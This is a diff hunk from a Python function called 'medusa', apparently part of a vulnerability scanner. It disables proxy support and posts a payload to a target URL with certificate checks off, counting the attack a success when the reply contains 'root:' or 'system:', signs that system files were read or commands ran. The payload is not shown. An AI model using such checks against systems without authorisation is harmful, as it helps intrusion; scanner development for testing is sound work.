@@ -53,14 +53,14 @@ def medusa(Url,RandomAgent,ProxyIp):
             'User-Agent': RandomAgent,
         }
         #s = requests.session()
-        if ProxyIp!=None:
-            proxies = {
-                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
-                "http": "http://" + str(ProxyIp)
-            }
-            resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=10, verify=False)
-        elif ProxyIp==None:
-            resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
+        # if ProxyIp!=None:
+        #     proxies = {
+        #         # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
+        #         "http": "http://" + str(ProxyIp)
+        #     }
+        #     resp = requests.post(payload_url, data=post_data, headers=headers, proxies=proxies, timeout=10, verify=False)
+        # elif ProxyIp==None:
+        resp = requests.post(payload_url, data=post_data,headers=headers, timeout=10, verify=False)
         con = resp.content
         code = resp.status_code
         if code==200 and (con.lower().find('system:')!=-1 or con.lower().find('root:')!=-1):
